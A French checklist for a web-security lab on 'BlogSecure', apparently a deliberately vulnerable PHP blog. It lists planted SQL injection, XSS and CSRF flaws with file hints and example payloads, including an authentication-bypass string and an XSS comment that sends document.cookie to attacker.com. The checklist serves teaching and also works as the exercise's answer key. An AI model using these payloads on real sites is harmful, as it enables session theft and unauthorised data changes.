# Checklist d'Audit - BlogSecure

Cette checklist vous aide à trouver systematiquement toutes les failles de sécurité présentes dans BlogSecure.

## 🔍 Failles d'Injection SQL

### ✓ À trouver: Injection SQL dans le login
- **Fichier** : `auth.php`
- **Fonction** : Comparaison username/password
- **Problème** : Les variables `$username` et `$password` sont directement concaténées dans la requête SQL
- **Impact** : Un attaquant peut contourner l'authentification en entrant `admin' --`
- **Indice** : Cherchez la ligne contenant `WHERE username = '"`

### ✓ À trouver: Injection SQL dans l'inscription
- **Fichier** : `auth.php`
- **Fonction** : Inscription utilisateur
- **Problème** : Concaténation directe des variables `$username`, `$email`, `$password`
- **Impact** : Injection de code SQL malveillant
- **Indice** : Cherchez `INSERT INTO users`

### ✓ À trouver: Injection SQL dans l'affichage d'article
- **Fichier** : `article.php`
- **Problème** : `WHERE articles.id = " . $article_id`
- **Impact** : Un attaquant peut récupérer plusieurs articles ou modifier les requêtes
- **Indice** : Tentez `article.php?id=1 OR 1=1`

### ✓ À trouver: Injection SQL dans les commentaires
- **Fichier** : `article.php` et `add_comment.php`
- **Problème** : Concaténation de `$article_id`, `$user_id`, et surtout `$comment`
- **Impact** : Un attaquant peut injecter du code SQL dans ses commentaires
- **Indice** : Cherchez les requêtes commentaires sans prepared statements

### ✓ À trouver: Injection SQL dans la suppression
- **Fichier** : `delete_article.php`
- **Problème** : `WHERE id = " . $article_id`
- **Impact** : Suppression non autorisée d'articles
- **Indice** : L'ID vient directement du GET/POST

### ✓ À trouver: Injection SQL dans la création d'article
- **Fichier** : `create_article.php`
- **Problème** : INSERT sans prepared statement
- **Impact** : Injection via le titre ou le contenu
- **Indice** : Cherchez `INSERT INTO articles`

---

## 🎯 Failles XSS (Cross-Site Scripting)

### ✓ À trouver: XSS dans le titre d'article
- **Fichier** : `article.php`
- **Problème** : `<h1><?php echo $article['title']; ?></h1>`
- **Impact** : Un attaquant crée un article avec du code JavaScript
- **Exploitation** : Créer un article avec le titre `<img src=x onerror="alert('XSS')">`
- **Indice** : Cherchez `echo` sans `htmlspecialchars`

### ✓ À trouver: XSS dans le contenu d'article
- **Fichier** : `article.php`
- **Problème** : `<p><?php echo $article['content']; ?></p>`
- **Impact** : Injection de code JavaScript dans le contenu
- **Exploitation** : `<script>alert('XSS')</script>`
- **Indice** : Le contenu n'est pas échappé

### ✓ À trouver: XSS dans les commentaires
- **Fichier** : `article.php`
- **Problème** : `<div class="comment-text"><?php echo $comment['comment']; ?></div>`
- **Impact** : Code JavaScript injecté dans les commentaires
- **Exploitation** : Commenter avec `<img src=x onerror="fetch('http://attacker.com?c='+document.cookie)">`
- **Indice** : Pas d'échappement du commentaire avant affichage

### ✓ À trouver: XSS dans le nom d'utilisateur
- **Fichier** : `index.php`, `article.php`
- **Problème** : `Par <?php echo $article['username']; ?>`
- **Impact** : Moins critique car contrôlé à l'inscription, mais possible
- **Indice** : Les usernames ne sont pas échappés

---

## 🛡️ Failles CSRF (Cross-Site Request Forgery)

### ✓ À trouver: CSRF sur la suppression d'article
- **Fichier** : `index.php` et `delete_article.php`
- **Problème** : Suppression par GET sans token CSRF
- **Impact** : Un attaquant peut faire supprimer les articles d'un utilisateur sans son consentement
- **Exploitation** : 
  ```html
  <!-- Page attacker.com -->
  <img src="http://blogsecure.com/delete_article.php?id=1" />
  ```
- **Indice** : Le lien de suppression est un simple GET

### ✓ À trouver: CSRF sur le login
- **Fichier** : `login.php`
- **Problème** : Formulaire sans token CSRF
- **Impact** : Faible, mais c'est une mauvaise pratique
- **Indice** : Pas de token caché dans le formulaire

### ✓ À trouver: CSRF sur l'inscription
- **Fichier** : `register.php`
- **Problème** : Formulaire sans token CSRF
- **Impact** : Un attaquant peut forcer l'inscription d'utilisateurs
- **Indice** : Pas de token dans le formulaire

### ✓ À trouver: CSRF sur l'ajout de commentaire
- **Fichier** : `article.php` et `add_comment.php`
- **Problème** : Formulaire sans token CSRF
- **Impact** : Un attaquant peut poster des commentaires au nom d'un utilisateur
- **Indice** : Formulaire sans protection

### ✓ À trouver: CSRF sur la création d'article
- **Fichier** : `create_article.php`
- **Problème** : Formulaire sans token CSRF
- **Impact** : Création d'articles non autorisée
- **Indice** : Pas de token caché

---

## 🔐 Autres Failles de Sécurité

### ✓ À trouver: Mots de passe en texte brut
- **Fichier** : `auth.php`
- **Problème** : 
  ```php
  VALUES ('$username', '$email', '$password')  // Pas de hash!
  ```
- **Impact** : Si la base de données est volée, tous les mots de passe sont visibles
- **Risque** : Critique
- **Indice** : Pas d'appel à `password_hash()`

### ✓ À trouver: Pas de validation des entrées
- **Fichier** : Tous les fichiers
- **Problème** : Les données utilisateur ne sont pas validées
- **Impact** : Permet les injections SQL et XSS
- **Indice** : Pas de vérification de longueur, format, etc.

### ✓ À trouver: Configuration DB en clair
- **Fichier** : `config.php`
- **Problème** : `define('DB_PASSWORD', '');`
- **Impact** : Les identifiants de base de données sont visibles dans le code source
- **Indice** : Les credentials sont définis en constantes publiques

### ✓ À trouver: Affichage des erreurs SQL
- **Fichier** : `auth.php` et autres
- **Problème** : `$conn->error` affiché à l'utilisateur
- **Impact** : Fuite d'informations sur la structure de la base de données
- **Indice** : Les messages d'erreur révèlent des infos sensibles

### ✓ À trouver: Pas de rate limiting
- **Fichier** : `auth.php`
- **Problème** : Nombre illimité de tentatives de login
- **Impact** : Brute force attack possible
- **Indice** : Pas de compteur de tentatives échouées

---

## 📋 Tableau de Synthèse

| # | Type | Fichier | Ligne/Zone | Sévérité |
|---|------|---------|-----------|----------|
| 1 | Injection SQL | auth.php | Login | 🔴 Critique |
| 2 | Injection SQL | auth.php | Inscription | 🔴 Critique |
| 3 | Passwords plaintext | auth.php | Registration | 🔴 Critique |
| 4 | Injection SQL | article.php | SELECT article | 🔴 Critique |
| 5 | XSS | article.php | Title display | 🟠 Élevée |
| 6 | XSS | article.php | Content display | 🟠 Élevée |
| 7 | XSS | article.php | Comments | 🟠 Élevée |
| 8 | Injection SQL | article.php | SELECT comments | 🔴 Critique |
| 9 | CSRF | index.php | Delete link | 🔴 Critique |
| 10 | CSRF | login.php | Form | 🟠 Élevée |
| 11 | CSRF | register.php | Form | 🟠 Élevée |
| 12 | CSRF | article.php | Comment form | 🟠 Élevée |
| 13 | CSRF | create_article.php | Form | 🟠 Élevée |
| 14 | Injection SQL | add_comment.php | INSERT | 🔴 Critique |
| 15 | Injection SQL | delete_article.php | DELETE | 🔴 Critique |
| 16 | Injection SQL | create_article.php | INSERT | 🔴 Critique |

---

## 🎯 Conseils pour l'Audit

1. **Commencez par les injections SQL** : Cherchez tous les `WHERE`, `INSERT`, `UPDATE`, `DELETE` sans prepared statements
2. **Puis cherchez les XSS** : Cherchez tous les `echo` sans `htmlspecialchars`
3. **Enfin les CSRF** : Cherchez les formulaires sans tokens
4. **Testez en action** :
   - Inscription et login
   - Création/lecture/suppression d'articles
   - Commentaires
   - Actions malveillantes (injection de code, XSS, etc.)

---

## ✅ Vérification Finale

Avez-vous trouvé et documenté :
- [ ] Au moins 4-5 injections SQL différentes ?
- [ ] Au moins 3-4 failles XSS ?
- [ ] Au moins 3-4 failles CSRF ?
- [ ] Au moins 2 autres failles (passwords, validation, etc.) ?
- [ ] Pour chaque faille : description, impact, exploitation, correction ?

---

*Checklist d'Audit - BlogSecure TP de Sécurité Web*
